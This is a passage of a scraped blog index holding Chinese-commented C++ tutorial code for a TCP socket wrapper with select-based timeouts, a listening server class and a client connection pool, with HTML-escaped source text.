61362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482#include &quot;TcpSocket.h&quot;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/select.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netdb.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;TcpSocket::TcpSocket()&#123;&#125;TcpSocket::TcpSocket(int connfd)&#123; m_socket = connfd;&#125;TcpSocket::~TcpSocket()&#123;&#125;int TcpSocket::connectToHost(char * ip, unsigned short port, int timeout)&#123; int ret = 0; if (ip == NULL || port &lt;= 0 || port &gt; 65535 || timeout &lt; 0) &#123; ret = ParamError; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func sckClient_connect() err, check (ip==NULL || connfd==NULL || port&lt;=0 || port&gt;65537 || connecttime &lt; 0)&quot;); return ret; &#125; m_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); if (m_socket &lt; 0) &#123; ret = errno; printf(&quot;func socket() err: %d\\n&quot;, ret); return ret; &#125; struct sockaddr_in servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_port = htons(port); servaddr.sin_addr.s_addr = inet_addr(ip); ret = connectTimeout((struct sockaddr_in*) (&amp;servaddr), (unsigned int)timeout); if (ret &lt; 0) &#123; if (ret == -1 &amp;&amp; errno == ETIMEDOUT) &#123; ret = TimeoutError; return ret; &#125; else &#123; //printf(&quot;func connect_timeout() err: %d\\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func connect_timeout() err&quot;); &#125; &#125; return ret;&#125;int TcpSocket::sendMsg(char * sendData, int dataLen, int timeout)&#123; int ret = 0; if (sendData == NULL || dataLen &lt;= 0) &#123; ret = ParamError; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func sckClient_send() err, check (data == NULL || datalen &lt;= 0)&quot;); return ret; &#125; ret = writeTimeout(timeout); if (ret == 0) &#123; int writed = 0; unsigned char *netdata = (unsigned char *)malloc(dataLen + 4); if (netdata == NULL) &#123; ret = MallocError; printf(&quot;func sckClient_send() mlloc Err:%d\\n &quot;, ret); return ret; &#125; int netlen = htonl(dataLen); memcpy(netdata, &amp;netlen, 4); memcpy(netdata + 4, sendData, dataLen); writed = writen(netdata, dataLen + 4); if (writed &lt; (dataLen + 4)) &#123; if (netdata != NULL) &#123; free(netdata); netdata = NULL; &#125; return writed; &#125; if (netdata != NULL) //wangbaoming 20150630 modify bug &#123; free(netdata); netdata = NULL; &#125; &#125; if (ret &lt; 0) &#123; //失败返回-1，超时返回-1并且errno = ETIMEDOUT if (ret == -1 &amp;&amp; errno == ETIMEDOUT) &#123; ret = TimeoutError; printf(&quot;func sckClient_send() mlloc Err:%d\\n &quot;, ret); return ret; &#125; return ret; &#125; return ret;&#125;int TcpSocket::recvMsg(char ** recvData, int &amp; recvLen, int timeout)&#123; int ret = 0; if (recvData == NULL || recvLen == NULL) &#123; ret = ParamError; printf(&quot;func sckClient_rev() timeout , err:%d \\n&quot;, TimeoutError); return ret; &#125; ret = readTimeout(timeout); //bugs modify bombing if (ret != 0) &#123; if (ret == -1 || errno == ETIMEDOUT) &#123; ret = TimeoutError; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func read_timeout() timeout&quot;); return ret; &#125; else &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func read_timeout() err&quot;); return ret; &#125; &#125; int netdatalen = 0; ret = readn(&amp;netdatalen, 4); //读包头 4个字节 if (ret == -1) &#123; //printf(&quot;func readn() err:%d \\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func readn() err&quot;); return ret; &#125; else if (ret &lt; 4) &#123; ret = PeerCloseError; //printf(&quot;func readn() err peer closed:%d \\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func readn() err, peer closed&quot;); return ret; &#125; int n; n = ntohl(netdatalen); char* tmpBuf = (char *)malloc(n + 1); if (tmpBuf == NULL) &#123; ret = MallocError; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;malloc() err&quot;); return ret; &#125; ret = readn(tmpBuf, n); //根据长度读数据 if (ret == -1) &#123; //printf(&quot;func readn() err:%d \\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;readn() err&quot;); return ret; &#125; else if (ret &lt; n) &#123; ret = PeerCloseError; //printf(&quot;func readn() err peer closed:%d \\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func readn() err, peer closed&quot;); return ret; &#125; *recvData = tmpBuf; recvLen = n; tmpBuf[n] = &apos;\\0&apos;; //多分配一个字节内容，兼容可见字符串 字符串的真实长度仍然为n return 0;&#125;void TcpSocket::disConnect()&#123; if (m_socket &gt;= 0) &#123; close(m_socket); &#125;&#125;void TcpSocket::freeMemory(char ** buf)&#123; if (*buf != NULL) &#123; free(*buf); *buf = NULL; &#125;&#125;/////////////////////////////////////////////////////// 子函数 ////////////////////////////////////////////////////////** blockIO - 设置I/O为非阻塞模式* @fd: 文件描符符*/int TcpSocket::blockIO(int fd)&#123; int ret = 0; int flags = fcntl(fd, F_GETFL); if (flags == -1) &#123; ret = flags; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func activate_nonblock() err&quot;); return ret; &#125; flags |= O_NONBLOCK; ret = fcntl(fd, F_SETFL, flags); if (ret == -1) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func activate_nonblock() err&quot;); return ret; &#125; return ret;&#125;/** noBlockIO - 设置I/O为阻塞模式* @fd: 文件描符符*/int TcpSocket::noBlockIO(int fd)&#123; int ret = 0; int flags = fcntl(fd, F_GETFL); if (flags == -1) &#123; ret = flags; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func deactivate_nonblock() err&quot;); return ret; &#125; flags &amp;= ~O_NONBLOCK; ret = fcntl(fd, F_SETFL, flags); if (ret == -1) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func deactivate_nonblock() err&quot;); return ret; &#125; return ret;&#125;/** readTimeout - 读超时检测函数，不含读操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::readTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set read_fdset; struct timeval timeout; FD_ZERO(&amp;read_fdset); FD_SET(m_socket, &amp;read_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; //select返回值三态 //1 若timeout时间到（超时），没有检测到读事件 ret返回=0 //2 若ret返回&lt;0 &amp;&amp; errno == EINTR 说明select的过程中被别的信号中断（可中断睡眠原理） //2-1 若返回-1，select出错 //3 若ret返回值&gt;0 表示有read事件发生，返回事件发生的个数 do &#123; ret = select(m_socket + 1, &amp;read_fdset, NULL, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125;/** writeTimeout - 写超时检测函数，不含写操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::writeTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set write_fdset; struct timeval timeout; FD_ZERO(&amp;write_fdset); FD_SET(m_socket, &amp;write_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; ret = select(m_socket + 1, NULL, &amp;write_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125;/** connectTimeout - connect* @addr: 要连接的对方地址* @wait_seconds: 等待超时秒数，如果为0表示正常模式* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::connectTimeout(sockaddr_in *addr, unsigned int wait_seconds)&#123; int ret; socklen_t addrlen = sizeof(struct sockaddr_in); if (wait_seconds &gt; 0) blockIO(m_socket); ret = connect(m_socket, (struct sockaddr*)addr, addrlen); if (ret &lt; 0 &amp;&amp; errno == EINPROGRESS) &#123; //printf(&quot;11111111111111111111\\n&quot;); fd_set connect_fdset; struct timeval timeout; FD_ZERO(&amp;connect_fdset); FD_SET(m_socket, &amp;connect_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; // 一但连接建立，则套接字就可写 所以connect_fdset放在了写集合中 ret = select(m_socket + 1, NULL, &amp;connect_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret &lt; 0) return -1; else if (ret == 1) &#123; //printf(&quot;22222222222222222\\n&quot;); /* ret返回为1（表示套接字可写），可能有两种情况，一种是连接建立成功，一种是套接字产生错误，*/ /* 此时错误信息不会保存至errno变量中，因此，需要调用getsockopt来获取。 */ int err; socklen_t socklen = sizeof(err); int sockoptret = getsockopt(m_socket, SOL_SOCKET, SO_ERROR, &amp;err, &amp;socklen); if (sockoptret == -1) &#123; return -1; &#125; if (err == 0) &#123; //printf(&quot;3333333333333\\n&quot;); ret = 0; &#125; else &#123; //printf(&quot;4444444444444444:%d\\n&quot;, err); errno = err; ret = -1; &#125; &#125; &#125; if (wait_seconds &gt; 0) &#123; noBlockIO(m_socket); &#125; return ret;&#125;/** readn - 读取固定字节数* @fd: 文件描述符* @buf: 接收缓冲区* @count: 要读取的字节数* 成功返回count，失败返回-1，读到EOF返回&lt;count*/int TcpSocket::readn(void *buf, int count)&#123; size_t nleft = count; ssize_t nread; char *bufp = (char*)buf; while (nleft &gt; 0) &#123; if ((nread = read(m_socket, bufp, nleft)) &lt; 0) &#123; if (errno == EINTR) continue; return -1; &#125; else if (nread == 0) return count - nleft; bufp += nread; nleft -= nread; &#125; return count;&#125;/** writen - 发送固定字节数* @buf: 发送缓冲区* @count: 要读取的字节数* 成功返回count，失败返回-1*/int TcpSocket::writen(const void *buf, int count)&#123; size_t nleft = count; ssize_t nwritten; char *bufp = (char*)buf; while (nleft &gt; 0) &#123; if ((nwritten = write(m_socket, bufp, nleft)) &lt; 0) &#123; if (errno == EINTR) continue; return -1; &#125; else if (nwritten == 0) continue; bufp += nwritten; nleft -= nwritten; &#125; return count;&#125; 服务端类 TcpServer.h 12345678910111213141516171819202122232425262728#pragma once#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &quot;ItcastLog.h&quot;#include &quot;TcpSocket.h&quot;// 超时的时间// static const int TIMEOUT = 10000;class TcpServer&#123;public: TcpServer(); ~TcpServer(); // 服务器设置监听 int setListen(unsigned short port); // 等待并接受客户端连接请求, 默认连接超时时间为10000s TcpSocket* acceptConn(int timeout = 10000); void closefd();private: int acceptTimeout(int wait_seconds);private: int m_lfd; // 用于监听的文件描述符 struct sockaddr_in m_addrCli; ItcastLog m_log;&#125;; TcpServer.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#include &quot;TcpServer.h&quot;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;TcpServer::TcpServer()&#123;&#125;TcpServer::~TcpServer()&#123;&#125;int TcpServer::setListen(unsigned short port)&#123; int ret = 0; struct sockaddr_in servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_port = htons(port); servaddr.sin_addr.s_addr = htonl(INADDR_ANY); m_lfd = socket(PF_INET, SOCK_STREAM, 0); if (m_lfd &lt; 0) &#123; ret = errno; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func socket() err&quot;); return ret; &#125; int on = 1; ret = setsockopt(m_lfd, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on)); if (ret &lt; 0) &#123; ret = errno; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func setsockopt() err&quot;); return ret; &#125; ret = bind(m_lfd, (struct sockaddr*)&amp;servaddr, sizeof(servaddr)); if (ret &lt; 0) &#123; ret = errno; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func bind() err&quot;); return ret; &#125; ret = listen(m_lfd, SOMAXCONN); if (ret &lt; 0) &#123; ret = errno; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func listen() err&quot;); return ret; &#125; return ret;&#125;TcpSocket* TcpServer::acceptConn(int timeout)&#123; int connfd = acceptTimeout(timeout); if (connfd &lt; 0) &#123; if (connfd == -1 &amp;&amp; errno == ETIMEDOUT) &#123; //printf(&quot;func accept_timeout() timeout err:%d \\n&quot;, ret); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, connfd, &quot;func acceptConn() TimeOutError&quot;); &#125; else &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, connfd, &quot;func acceptConn() OtherError&quot;); &#125; return NULL; &#125; return new TcpSocket(connfd);&#125;void TcpServer::closefd()&#123; close(m_lfd);&#125;int TcpServer::acceptTimeout(int wait_seconds)&#123; int ret; socklen_t addrlen = sizeof(struct sockaddr_in); if (wait_seconds &gt; 0) &#123; fd_set accept_fdset; struct timeval timeout; FD_ZERO(&amp;accept_fdset); FD_SET(m_lfd, &amp;accept_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; ret = select(m_lfd + 1, &amp;accept_fdset, NULL, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == -1) return -1; else if (ret == 0) &#123; errno = ETIMEDOUT; return -1; &#125; &#125; //一但检测出 有select事件发生，表示对等方完成了三次握手，客户端有新连接建立 //此时再调用accept将不会堵塞 ret = accept(m_lfd, (struct sockaddr*)&amp;m_addrCli, &amp;addrlen); //返回已连接套接字 if (ret == -1) &#123; ret = errno; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, ret, &quot;func accept() err&quot;); return ret; &#125; return ret;&#125;","categories":[],"tags":[]},{"title":"使用select函数实现超时控制","slug":"使用select函数实现超时控制","date":"2022-05-23T23:54:43.000Z","updated":"2022-05-24T00:10:19.711Z","comments":true,"path":"2022/05/24/使用select函数实现超时控制/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/24/使用select函数实现超时控制/","excerpt":"","text":"recv 1recv(sockfd,buf,len,MSG_PEEK); MSG_PEEK代表从缓冲区提取数据之后,缓冲区原来的数据不会丢失 相当于复制一份 实现sleep(10)的功能: 1select(fd + 1, &amp;NULL, NULL, NULL, &amp;timeout); 超时 接受客户端连接请求超时(accept) 建立连接请求超时(connect) 发送请求超时(write，send或sendto) 接收请求超时(recv或read) 连接服务端超时实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int TcpSocket::connectTimeout(sockaddr_in *addr, unsigned int wait_seconds)&#123; int ret; socklen_t addrlen = sizeof(struct sockaddr_in); if (wait_seconds &gt; 0) blockIO(m_socket); ret = connect(m_socket, (struct sockaddr*)addr, addrlen); if (ret &lt; 0 &amp;&amp; errno == EINPROGRESS) &#123; //printf(&quot;11111111111111111111\\n&quot;); fd_set connect_fdset; struct timeval timeout; FD_ZERO(&amp;connect_fdset); FD_SET(m_socket, &amp;connect_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; // 一但连接建立，则套接字就可写 所以connect_fdset放在了写集合中 ret = select(m_socket + 1, NULL, &amp;connect_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret &lt; 0) return -1; else if (ret == 1) &#123; //printf(&quot;22222222222222222\\n&quot;); /* ret返回为1（表示套接字可写），可能有两种情况，一种是连接建立成功，一种是套接字产生错误，*/ /* 此时错误信息不会保存至errno变量中，因此，需要调用getsockopt来获取。 */ int err; socklen_t socklen = sizeof(err); int sockoptret = getsockopt(m_socket, SOL_SOCKET, SO_ERROR, &amp;err, &amp;socklen); if (sockoptret == -1) &#123; return -1; &#125; if (err == 0) &#123; //printf(&quot;3333333333333\\n&quot;); ret = 0; &#125; else &#123; //printf(&quot;4444444444444444:%d\\n&quot;, err); errno = err; ret = -1; &#125; &#125; &#125; if (wait_seconds &gt; 0) &#123; noBlockIO(m_socket); &#125; return ret;&#125; 发送数据超时检测实现 12345678910111213141516171819202122232425262728293031323334/** writeTimeout - 写超时检测函数，不含写操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::writeTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set write_fdset; struct timeval timeout; FD_ZERO(&amp;write_fdset); FD_SET(m_socket, &amp;write_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; ret = select(m_socket + 1, NULL, &amp;write_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125; 读超时检测实现 123456789101112131415161718192021222324252627282930313233343536373839404142/** readTimeout - 读超时检测函数，不含读操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::readTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set read_fdset; struct timeval timeout; FD_ZERO(&amp;read_fdset); FD_SET(m_socket, &amp;read_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; //select返回值三态 //1 若timeout时间到（超时），没有检测到读事件 ret返回=0 //2 若ret返回&lt;0 &amp;&amp; errno == EINTR 说明select的过程中被别的信号中断（可中断睡眠原理） //2-1 若返回-1，select出错 //3 若ret返回值&gt;0 表示有read事件发生，返回事件发生的个数 do &#123; ret = select(m_socket + 1, &amp;read_fdset, NULL, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"客户端连接池","slug":"客户端连接池","date":"2022-05-23T23:47:47.000Z","updated":"2022-05-23T23:53:19.109Z","comments":true,"path":"2022/05/24/客户端连接池/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/24/客户端连接池/","excerpt":"","text":"TcpSocket.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#pragma once#include \"TcpSocket.h\"#include &lt;string&gt;using namespace std;// 初始化连接池的结构体struct PoolParam&#123; int bounds; //池容量 int connecttime; int sendtime; int revtime; string serverip; unsigned short serverport;&#125;;class PoolSocket&#123;public: enum ErrorType &#123; ParamErr = 3000 + 1, TimeOut, PeerClose, MallocErr, CreateConnErr, // 创建连接池 （没有达到最大连接数） terminated, // 已终止 ValidIsZero, // 有效连接数是零 HaveExist, // 连接已经在池中 ValidBounds // 有效连接数目超过了最大连接数 &#125;; PoolSocket(); ~PoolSocket(); int poolInit(PoolParam *param); // 从连接池中获取一条连接 TcpSocket* getConnect(); // 将连接放回到连接池 int putConnect(TcpSocket* sock, bool isValid); // 释放连接池资源 void poolDestory(); int curConnSize();private: void connectServer(bool recursion = true);private: void* m_handle;&#125;; TcpSocket.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168#include \"PoolSocket.h\"#include &lt;string.h&gt;#include &lt;pthread.h&gt;#include &lt;queue&gt;#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;using namespace std;// Socket连接池结构PoolHandlestruct PoolHandle&#123; queue&lt;TcpSocket*&gt; sockList; // 存储可以通信的套接字对象 int bounds; // Socket连接池的容量 string serverip; unsigned short serverport; int connecttime; int sTimeout; // 没有连接时，等待之间 pthread_mutex_t foo_mutex;&#125;;PoolSocket::PoolSocket()&#123;&#125;PoolSocket::~PoolSocket()&#123;&#125;int PoolSocket::poolInit(PoolParam * param)&#123; int ret = 0; PoolHandle *hdl = new PoolHandle; m_handle = hdl; //初始化 句柄 if (hdl == NULL) &#123; ret = MallocErr; return ret; &#125; // 数据初始化 hdl-&gt;serverip = param-&gt;serverip; hdl-&gt;serverport = param-&gt;serverport; hdl-&gt;connecttime = param-&gt;connecttime; //处理连接数 hdl-&gt;bounds = param-&gt;bounds; hdl-&gt;sTimeout = 100; pthread_mutex_init(&amp;(hdl-&gt;foo_mutex), NULL); pthread_mutex_lock(&amp;(hdl-&gt;foo_mutex)); //流程加锁 // 创建用于通信的套接字对象 connectServer(); pthread_mutex_unlock(&amp;(hdl-&gt;foo_mutex)); //解锁 return ret;&#125;TcpSocket* PoolSocket::getConnect()&#123; PoolHandle *hdl = static_cast&lt;PoolHandle*&gt;(m_handle); // 流程加锁 pthread_mutex_unlock(&amp; (hdl-&gt;foo_mutex) ); //解锁 pthread_mutex_lock(&amp;(hdl-&gt;foo_mutex)); // 若 有效连数 = 0 if (hdl-&gt;sockList.size() == 0) &#123; usleep(hdl-&gt;sTimeout); //等上几微妙 // 还是没有可用的连接 if (hdl-&gt;sockList.size() == 0) &#123; return NULL; &#125; &#125; // 从对头取出一条连接, 并将该节点弹出 TcpSocket* sock = hdl-&gt;sockList.front(); hdl-&gt;sockList.pop(); cout &lt;&lt; \"取出一条连接, 剩余连接数: \" &lt;&lt; curConnSize() &lt;&lt; endl; pthread_mutex_unlock(&amp;(hdl-&gt;foo_mutex)); //解锁 return sock;&#125;int PoolSocket::putConnect(TcpSocket* sock, bool isValid)&#123; int ret = 0; PoolHandle *hdl = static_cast&lt;PoolHandle*&gt;(m_handle); pthread_mutex_lock(&amp;(hdl-&gt;foo_mutex)); //流程加锁 // 判断连接是否已经被 放进来 // 判断该连接是否已经被释放 if (isValid) &#123; // 连接可用, 放入队列 hdl-&gt;sockList.push(sock); cout &lt;&lt; \"放回一条连接, 剩余连接数: \" &lt;&lt; curConnSize() &lt;&lt; endl; &#125; else &#123; // 套接字不可用, 析构对象, 在创建一个新的连接 sock-&gt;disConnect(); delete sock; connectServer(false); cout &lt;&lt; \"修复一条连接, 剩余连接数: \" &lt;&lt; curConnSize() &lt;&lt; endl; &#125; pthread_mutex_unlock(&amp;(hdl-&gt;foo_mutex)); //解锁 return ret;&#125;void PoolSocket::poolDestory()&#123; PoolHandle *hdl = static_cast&lt;PoolHandle*&gt;(m_handle); // 遍历队列 while (hdl-&gt;sockList.size() != 0) &#123; // 取出对头元素 TcpSocket* sock = hdl-&gt;sockList.front(); // 弹出对头原始 hdl-&gt;sockList.pop(); // 释放内存 delete sock; &#125; delete hdl;&#125;int PoolSocket::curConnSize()&#123; PoolHandle *hdl = static_cast&lt;PoolHandle*&gt;(m_handle); return hdl-&gt;sockList.size();&#125;void PoolSocket::connectServer(bool recursion)&#123; PoolHandle *hdl = static_cast&lt;PoolHandle*&gt;(m_handle); if ((int)hdl-&gt;sockList.size() == hdl-&gt;bounds) &#123; cout &lt;&lt; \"连接池对象初始化完毕, ^_^ ...\" &lt;&lt; endl; cout &lt;&lt; \"Poll Size: \" &lt;&lt; hdl-&gt;sockList.size() &lt;&lt; endl; cout &lt;&lt; \"Poll bounds: \" &lt;&lt; hdl-&gt;bounds &lt;&lt; endl; return; &#125; TcpSocket* socket = new TcpSocket; char* ip = const_cast&lt;char*&gt;(hdl-&gt;serverip.data()); int ret = socket-&gt;connectToHost(ip, hdl-&gt;serverport, hdl-&gt;connecttime); if (ret == 0) &#123; // 成功连接服务器 hdl-&gt;sockList.push(socket); cout &lt;&lt; \"Connect count: \" &lt;&lt; hdl-&gt;sockList.size() &lt;&lt; endl; &#125; else &#123; // 失败 cout &lt;&lt; \"连接服务器失败 - index: \" &lt;&lt; hdl-&gt;sockList.size()+1 &lt;&lt; endl; // 释放对象 delete socket; &#125; if (recursion) &#123; // 递归调用 connectServer(); &#125;&#125; main.cpp 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include \"PoolSocket.h\"#include &lt;queue&gt;using namespace std;int main()&#123; PoolSocket pool; // 连接池的结构体 PoolParam param; param.bounds = 10; param.connecttime = 100; param.revtime = 100; param.sendtime = 100; param.serverip = \"127.0.0.1\"; param.serverport = 9999; pool.poolInit(&amp;param); queue&lt;TcpSocket*&gt; list; while (pool.curConnSize()) &#123; static int i = 0; TcpSocket* sock = pool.getConnect(); string str = \"hello, server ... \" + to_string(i++); sock-&gt;sendMsg((char*)str.c_str(), str.size()); list.push(sock); &#125; while (!list.empty()) &#123; TcpSocket* t = list.front(); pool.putConnect(t, false); list.pop(); &#125; cout &lt;&lt; \"max value: \" &lt;&lt; pool.curConnSize() &lt;&lt; endl; while (1); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"通信的套接字类","slug":"通信的套接字类","date":"2022-05-23T23:44:47.000Z","updated":"2022-05-23T23:46:52.081Z","comments":true,"path":"2022/05/24/通信的套接字类/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/24/通信的套接字类/","excerpt":"","text":"TcpSocket.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344#pragma once/* 用于通信的套接字类 */// 超时的时间static const int TIMEOUT = 1000;class TcpSocket&#123;public: enum ErrorType &#123;ParamError = 3001, TimeoutError, PeerCloseError, MallocError&#125;; TcpSocket(); // 使用一个可以用于通信的套接字实例化套接字对象 TcpSocket(int connfd); ~TcpSocket(); // 连接服务器 int connectToHost(char* ip, unsigned short port, int timeout = TIMEOUT); // 发送数据 int sendMsg(char* sendData, int dataLen, int timeout = TIMEOUT); // 接收数据 int recvMsg(char** recvData, int &amp;recvLen, int timeout = TIMEOUT); // 断开连接 void disConnect(); // 释放内存 void freeMemory(char** buf);private: // 设置I/O为非阻塞模式 int blockIO(int fd); // 设置I/O为阻塞模式 int noBlockIO(int fd); // 读超时检测函数，不含读操作 int readTimeout(unsigned int wait_seconds); // 写超时检测函数, 不包含写操作 int writeTimeout(unsigned int wait_seconds); // 带连接超时的connect函数 int connectTimeout(struct sockaddr_in *addr, unsigned int wait_seconds); // 每次从缓冲区中读取n个字符 int readn(void *buf, int count); // 每次往缓冲区写入n个字符 int writen(const void *buf, int count);private: int m_socket; // 用于通信的套接字&#125;; TcpSocket.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469#include \"TcpSocket.h\"#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/select.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netdb.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;TcpSocket::TcpSocket()&#123;&#125;TcpSocket::TcpSocket(int connfd)&#123; m_socket = connfd;&#125;TcpSocket::~TcpSocket()&#123; printf(\"TcpSocket 被析构...\\n\");&#125;int TcpSocket::connectToHost(char * ip, unsigned short port, int timeout)&#123; int ret = 0; if (ip == NULL || port &lt;= 0 || port &gt; 65535 || timeout &lt; 0) &#123; ret = ParamError; return ret; &#125; m_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); if (m_socket &lt; 0) &#123; ret = errno; printf(\"func socket() err: %d\\n\", ret); return ret; &#125; struct sockaddr_in servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_port = htons(port); servaddr.sin_addr.s_addr = 